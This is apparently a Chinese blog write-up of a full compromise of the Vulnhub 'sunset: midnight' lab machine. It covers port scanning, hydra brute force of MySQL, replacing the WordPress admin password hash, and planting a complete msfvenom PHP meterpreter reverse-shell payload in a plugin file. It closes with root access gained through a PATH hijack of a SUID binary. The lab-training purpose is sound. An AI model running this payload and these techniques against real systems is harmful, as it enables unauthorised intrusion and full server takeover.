---
title: Vulnhub-sunset midnight
published: 2025-03-09
tags: [Vulnhub]
category: 靶机
draft: false
---

# sunset: midnight

> https://www.vulnhub.com/entry/sunset-midnight,517/
> 

## 主机发现端口扫描

1. 探测存活主机，`8`是靶机
    
    ```php
    nmap -sP 192.168.56.0/24                              
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 16:49 CST
    Nmap scan report for 192.168.56.1
    Host is up (0.00044s latency).
    MAC Address: 0A:00:27:00:00:14 (Unknown)
    Nmap scan report for 192.168.56.2
    Host is up (0.00028s latency).
    MAC Address: 08:00:27:37:A2:CB (Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.56.8
    Host is up (0.00039s latency).
    MAC Address: 08:00:27:A6:DF:28 (Oracle VirtualBox virtual NIC)
    Nmap scan report for 192.168.56.10
    ```
    
2. 扫描靶机所有开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.56.8   
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 16:50 CST
    Nmap scan report for sunset-midnight (192.168.56.8)
    Host is up (0.0012s latency).
    Not shown: 65532 closed tcp ports (conn-refused)
    PORT     STATE SERVICE
    22/tcp   open  ssh
    80/tcp   open  http
    3306/tcp open  mysql
    MAC Address: 08:00:27:A6:DF:28 (Oracle VirtualBox virtual NIC)
    ```
    
3. 扫描服务版本及系统版本
    
    ```php
    nmap -sV -sT -O -p 22,80,3306 192.168.56.8
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 16:51 CST
    Nmap scan report for sunset-midnight (192.168.56.8)
    Host is up (0.00052s latency).
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
    80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
    3306/tcp open  mysql   MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
    MAC Address: 08:00:27:A6:DF:28 (Oracle VirtualBox virtual NIC)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 4.X|5.X
    OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
    OS details: Linux 4.15 - 5.8
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```c
    nmap -script=vuln -p 22,80,3306 192.168.56.8                                                                                                                                                                  
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-05 16:51 CST                                                                                                                                                
    Nmap scan report for sunset-midnight (192.168.56.8)                                                      
    Host is up (0.00042s latency).                                                                           
                                                                                                             
    PORT     STATE SERVICE                                                                                   
    22/tcp   open  ssh                                                                                       
    80/tcp   open  http     
    | http-wordpress-users:                                                                                                                                                                                           
    | Username found: admin                                                                                                                                                                                           
    |_Search stopped at ID #25. Increase the upper limit if necessary with 'http-wordpress-users.limit'                                                                                                               
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.                                                                                                                                                  
    |_http-dombased-xss: Couldn't find any DOM based XSS.                                                                                                                                                             
    | http-enum:                                                                                             
    |   /blog/: Blog                                                                                         
    |   /wp-login.php: Possible admin folder                                                                 
    |   /wp-json: Possible admin folder                                                                      
    |   /robots.txt: Robots file                                                                             
    |   /readme.html: Wordpress version: 2                                                                   
    |   /: WordPress version: 5.4.2                                                                                                                                                                                   
    |   /feed/: Wordpress version: 5.4.2                                                                                                                                                                              
    |   /wp-includes/images/rss.png: Wordpress version 2.2 found.                                                                                                                                                     
    |   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.                                                                                                                                               
    |   /wp-includes/images/blank.gif: Wordpress version 2.6 found.                                                                                                                                                   
    |   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.                                                                                                                                                
    |   /wp-login.php: Wordpress login page.                                                                 
    |   /wp-admin/upgrade.php: Wordpress login page.                                                         
    |   /readme.html: Interesting, a readme.                                                                 
    |_  /contact/: Potentially interesting folder                                                                                                                                                                     
    3306/tcp open  mysql                                                                                                                                                                                              
    |_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)                                                                                                                                       
    MAC Address: 08:00:27:A6:DF:28 (Oracle VirtualBox virtual NIC)     
    ```
    
    靶机CMS是`wordpress` ，确定版本后可以查询公开漏洞进行利用
    
    并且扫出mysql可能存在`cve2012-2122`
    

## web渗透

1. 知道CMS是`wordpress`，就用`wpscan`来扫一下
    
    ```c
    wpscan --url http://sunset-midnight/  
    _______________________________________________________________  
             __          _______   _____                            
    				 \ \        / /  __ \ / ____|                                                                    
              \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®           
               \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \ 
                \  /\  /  | |     ____) | (__| (_| | | | |
                 \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                   
                                                                                                             
             WordPress Security Scanner by the WPScan Team                                                   
                             Version 3.8.27                                                                  
           Sponsored by Automattic - https://automattic.com/
           @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                          
    _______________________________________________________________                                          
                                                                                                             
    [i] It seems like you have not updated the database for some time.                                       
    [?] Do you want to update now? [Y]es [N]o, default: [N]n                                                 
    [+] URL: http://sunset-midnight/ [192.168.56.8]                                                          
    [+] Started: Thu Dec  5 17:56:06 2024                                                                    
                                                                                                             
    Interesting Finding(s):                                                                                  
     
    [+] Headers                                                                                              
     | Interesting Entry: Server: Apache/2.4.38 (Debian)  
     | Found By: Headers (Passive Detection)                                                                 
     | Confidence: 100%                                                                                      
                                                                                                             
    [+] robots.txt found: http://sunset-midnight/robots.txt                                                  
     | Interesting Entries:                                                                                  
     |  - /wp-admin/                                                                                         
     |  - /wp-admin/admin-ajax.php                                                                           
     | Found By: Robots Txt (Aggressive Detection)                                                           
     | Confidence: 100%
                                                        
    [+] XML-RPC seems to be enabled: http://sunset-midnight/xmlrpc.php
     | Found By: Direct Access (Aggressive Detection)                                                        
     | Confidence: 100%                                                                                      
     | References:                                                                     
     |  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                    
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/                  
     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/                         
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
                                                                                                              
    [+] WordPress readme found: http://sunset-midnight/readme.html   
     | Found By: Direct Access (Aggressive Detection)                                                        
     | Confidence: 100%                                                                                      
                                                                                                             
    [+] Upload directory has listing enabled: http://sunset-midnight/wp-content/uploads/                     
     | Found By: Direct Access (Aggressive Detection)                                                        
     | Confidence: 100%                                                                                      
                                                                                                             
    [+] The external WP-Cron seems to be enabled: http://sunset-midnight/wp-cron.php
     | Found By: Direct Access (Aggressive Detection)                                                        
     | Confidence: 60%                                                                                       
     | References:                                                                                           
     |  - https://www.iplocation.net/defend-wordpress-from-ddos                                              
     |  - https://github.com/wpscanteam/wpscan/issues/1299                                                   
                                                                                                             
    [+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).                               
     | Found By: Rss Generator (Passive Detection)                                                           
     |  - http://sunset-midnight/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>              
     |  - http://sunset-midnight/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>       
                                                                                                             
    [+] WordPress theme in use: twentyseventeen                                                              
     | Location: http://sunset-midnight/wp-content/themes/twentyseventeen/                                   
     | Last Updated: 2024-07-16T00:00:00.000Z                                                                
     | Readme: http://sunset-midnight/wp-content/themes/twentyseventeen/readme.txt                           
     | [!] The version is out of date, the latest version is 3.7                                             
     | Style URL: http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507            
     | Style Name: Twenty Seventeen                                                                          
     | Style URI: https://wordpress.org/themes/twentyseventeen/                                              
     | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
     | Author: the WordPress team                       
     | Author URI: https://wordpress.org/                                                                    
     |                                                                                                       
     | Found By: Css Style In Homepage (Passive Detection)                                                   
     | Confirmed By: Css Style In 404 Page (Passive Detection)                                    
     |                                                                                                       
     | Version: 2.3 (80% confidence)                                                                         
     | Found By: Style (Passive Detection)                                                                   
     |  - http://sunset-midnight/wp-content/themes/twentyseventeen/style.css?ver=20190507, Match: 'Version: 2.3'
    [+] Enumerating All Plugins (via Passive Methods)                                                        
    [+] Checking Plugin Versions (via Passive and Aggressive Methods)
                                                                                                             
    [i] Plugin(s) Identified:                                                                                
                                                                                                             
    [+] simply-poll-master                                                                                   
     | Location: http://sunset-midnight/wp-content/plugins/simply-poll-master/                               
     |                                                                                                       
     | Found By: Urls In Homepage (Passive Detection)                                                        
     | Confirmed By: Urls In 404 Page (Passive Detection)                           
     |                                                                                                       
     | Version: 1.5 (100% confidence)                                                                        
     | Found By: Readme - Stable Tag (Aggressive Detection)                                                  
     |  - http://sunset-midnight/wp-content/plugins/simply-poll-master/readme.txt                            
     | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)                                       
     |  - http://sunset-midnight/wp-content/plugins/simply-poll-master/readme.txt                            
                                                                                                             
    [+] Enumerating Config Backups (via Passive and Aggressive Methods)                                      
     Checking Config Backups - Time: 00:00:01 <==========> (137 / 137) 100.00% Time: 00:00:01
                                                                                                             
    [i] No Config Backups Found.                                                                             
                                                                                                             
    [!] No WPScan API Token given, as a result vulnerability data has not been output.                       
    [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register    
                                                                                                             
    [+] Finished: Thu Dec  5 17:56:14 2024                                                                   
    [+] Requests Done: 172                                                                                   
    [+] Cached Requests: 7                                                                                   
    [+] Data Sent: 43.472 KB                                                                                 
    [+] Data Received: 444.822 KB
    [+] Memory used: 331.578 MB                         
    [+] Elapsed time: 00:00:08  
    ```
    
    版本为`version 5.4.2` ，模板用的是`twentyseventeen` ，没扫到插件
    
2. 网上没找到什么漏洞可以利用的

## cve2012-2122

1. 上边`nmap`扫描出可能存在`cve2012-2122` ，我们尝试利用
    
    ```c
    msf6 > search 2012-2122 
    msf6 exploit(multi/handler) > use 0 
    msf6 auxiliary(scanner/mysql/mysql_authbypass_hashdump) > set rhosts 192.168.56.8
    rhosts => 192.168.56.8                              
    msf6 auxiliary(scanner/mysql/mysql_authbypass_hashdump) > run                                            
    
    [+] 192.168.56.8:3306     - 192.168.56.8:3306 The server allows logins, proceeding with bypass test      
    [*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 10% complete                      
    [*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 20% complete                      
    [*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 30% complete                      
    [*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 40% complete                      
    [*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 50% complete                      
    [*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 60% complete                      
    [*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 70% complete                      
    [*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 80% complete                      
    [*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 90% complete                      
    [*] 192.168.56.8:3306     - 192.168.56.8:3306 Authentication bypass is 100% complete                     
    [-] 192.168.56.8:3306     - 192.168.56.8:3306 Unable to bypass authentication, this target may not be vulnerable
    [*] 192.168.56.8:3306     - Scanned 1 of 1 hosts (100% complete)                                         
    [*] Auxiliary module execution completed
    ```
    
    但是没有利用成功
    

## 暴力破解

1. 没有思路了，可以尝试下暴力破解，`wordpress`我们枚举出了`admin`用户，`mysql`我们尝试破解`root`用户，同时进行破解
2. 暴力破解`wordpress`
    
    ```c
    wpscan --url http://sunset-midnight/ -U admin --passwords /usr/share/wordlists/rockyou.txt
    ```
    
3. 暴力破解`mysql`
    
    ```c
    hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.56.8 mysql
    ```
    
4. 很快就爆破出了`mysql`的密码
    
    ```c
    hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.56.8 mysql
    Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
    
    Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-05 23:13:16
    [INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)
    [DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
    [DATA] attacking mysql://192.168.56.8:3306/
    [3306][mysql] host: 192.168.56.8   login: root   password: robert
    1 of 1 target successfully completed, 1 valid password found
    Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-05 23:13:21
    ```
    
    密码是`robert`
    

## 数据库寻找敏感信息

1. 利用`Navicat`登录`mysql` ，寻找`WP`的用户表
    
    ![image.png](image%20103.png)
    
    发现密码，不过是加密的
    
2. 通过`hash-identifier` 识别
    
    ```c
    hash-identifier     
       #########################################################################
       #     __  __                     __           ______    _____           #  
       #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
       #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
       #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
       #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
       #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
       #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
       #                                                             By Zion3R #
       #                                                    www.Blackploit.com #
       #                                                   Root@Blackploit.com #
       #########################################################################
    --------------------------------------------------
     HASH: $P$BaWk4oeAmrdn453hR6O6BvDqoF9yy6/ 
    
    Possible Hashs:
    [+] MD5(Wordpress)
    ```
    
3. 尝试破解没破解出来
4. 创建了一个`MD5`替换上去即可
    
    下边是`123456`的`MD5`值，将其替换上去
    
    ```c
    e10adc3949ba59abbe56e057f20f883e
    ```
    
    ![image.png](image%20104.png)
    
5. 尝试登陆WP后台

## 后台getshell

1. 尝试登录`WP`后台，密码是上边替换上去的`123456`
    
    ![image.png](image%20105.png)
    
2. 在 `Plugins` → `Plugin Editor` 的右上角的`Select plugin to edit` 选择`Simply Poll` 然后`select`
    
    ![image.png](image%20106.png)
    
3. 然后选择`simply-poll.php` 进行修改，写入`phpinfo`进行测试
    
    ![image.png](image%20107.png)
    
4. 路径为 `/wp-content/plugins/simply-poll-master/simply-poll.php` ，访问
    
    ![image.png](image%20108.png)
    
    测试成功
    
5. 直接上线`MSF` (`.10`为`kali IP`)
    
    ```c
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
    msf6 exploit(multi/handler) > set lhost 192.168.56.10
    msf6 exploit(multi/handler) > set lport 1234
    msf6 exploit(multi/handler) > run
    ```
    
    然后再`msfvenom`生成`payload` ，然后将代码写入到上边的`simply-poll.php`
    
    ```c
    msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.10 lport=1234 -f raw            
    [-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
    [-] No arch selected, selecting arch: php from the payload
    No encoder specified, outputting raw payload
    Payload size: 1114 bytes
    
    /*<?php /**/ error_reporting(0); $ip = '192.168.56.10'; $port = 1234; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
    ```
    
    ![image.png](image%20109.png)
    
6. 然后再次访问`/wp-content/plugins/simply-poll-master/simply-poll.php` MSF获取到`shell`
    
    ```c
    msf6 exploit(multi/handler) > run
    
    [*] Started reverse TCP handler on 192.168.56.10:1234 
    [*] Sending stage (39927 bytes) to 192.168.56.8
    [*] Meterpreter session 1 opened (192.168.56.10:1234 -> 192.168.56.8:50890) at 2024-12-05 23:59:21 +0800
    
    meterpreter > 
    ```
    

## 提权

1. 查看权限
    
    ```c
    meterpreter > sysinfo
    Computer    : midnight
    OS          : Linux midnight 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
    Meterpreter : php/linux
    
    meterpreter > getuid
    Server username: www-data
    
    $ ip add
    ip add
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
           valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host 
           valid_lft forever preferred_lft forever
    2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
        link/ether 08:00:27:a6:df:28 brd ff:ff:ff:ff:ff:ff
        inet 192.168.56.8/24 brd 192.168.56.255 scope global dynamic enp0s3
           valid_lft 431sec preferred_lft 431sec
        inet6 fe80::a00:27ff:fea6:df28/64 scope link 
           valid_lft forever preferred_lft forever
    ```
    
2. 寻找敏感文件
    - `/var/www/html/wp-config.php` 发现`jose`账号密码（加密）
        
        ```c
        /** MySQL database username */                                                                                                                               
        define( 'DB_USER', 'jose' );                                                                                                                                 
                                                                                                                                                                     
        /** MySQL database password */                                                                                                                               
        define( 'DB_PASSWORD', '645dc5a8871d2a4269d4cbe23f6ae103' ); 
        ```
        
3. 尝试破解
    
    看起来是`MD5`，使用开膛手以及在线网站破解，无果
    
4. 最后尝试直接使用这串字符串登录
    
    ```c
    ssh jose@192.168.56.8  
    jose@192.168.56.8's password: 
    Linux midnight 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64
    
    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Sat Jul 18 15:33:29 2020 from 192.168.100.139
    jose@midnight:~$ 
    ```
    
    登陆成功。。。神经
    
5. 寻找敏感文件
    - 家目录下`user.txt`
        
        ```c
        jose@midnight:~$ cat user.txt 
        956a9564aa5632edca7b745c696f6575
        ```
        
        应该是flag
        
    - suid
        
        ```c
        jose@midnight:~$ find / -perm -u=s -type f 2>/dev/null
        /usr/bin/su
        /usr/bin/sudo
        /usr/bin/status
        /usr/bin/chfn
        /usr/bin/passwd
        /usr/bin/chsh
        /usr/bin/umount
        /usr/bin/newgrp
        /usr/bin/mount
        /usr/bin/gpasswd
        /usr/lib/eject/dmcrypt-get-device
        /usr/lib/dbus-1.0/dbus-daemon-launch-helper
        /usr/lib/openssh/ssh-keysign
        ```
        
6. `suid`发现`/usr/bin/status` 尝试执行
    
    ```c
    jose@midnight:/tmp$ status
    sh: 1: service: not found
    Status of the SSH server:
    ```
    
    去寻找了`service`，但是没找到
    
7. 思路：在新建`service`然后里边是提权代码，让`status`去找它（通过环境变量）
    - 新建`service`文件
        
        ```c
        jose@midnight:/tmp$ echo "/bin/bash" > service
        jose@midnight:/tmp$ chmod 777 service 
        ```
        
    - 修改环境变量，将`/tmp`目录放在前头（看目录进行修改）
        
        ```c
        jose@midnight:/tmp$ export PATH=/tmp:$PATH
        jose@midnight:/tmp$ echo $PATH
        /tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
        ```
        
    - 运行`status`
        
        ```c
        jose@midnight:/tmp$ /usr/bin/status
        root@midnight:/tmp# 
        ```
        
        获得root！！！
        
8. 读取`flag`
    
    ```c
    root@midnight:~# cd /root
    root@midnight:/root# ls
    root.txt  status  status.c
    root@midnight:/root# cat root.txt 
              ___   ____
            /' --;^/ ,-_\     \ | /
           / / --o\ o-\ \\   --(_)--
          /-/-/|o|-|\-\\|\\   / | \
           '`  ` |-|   `` '
                 |-|
                 |-|O
                 |-(\,__
              ...|-|\--,\_....
          ,;;;;;;;;;;;;;;;;;;;;;;;;,.
    ~,;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    ~;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;,  ______   ---------   _____     ------
    
    db2def9d4ddcb83902b884de39d426e6
    
    Thanks for playing! - Felipe Winsnes (@whitecr0wz)
    ```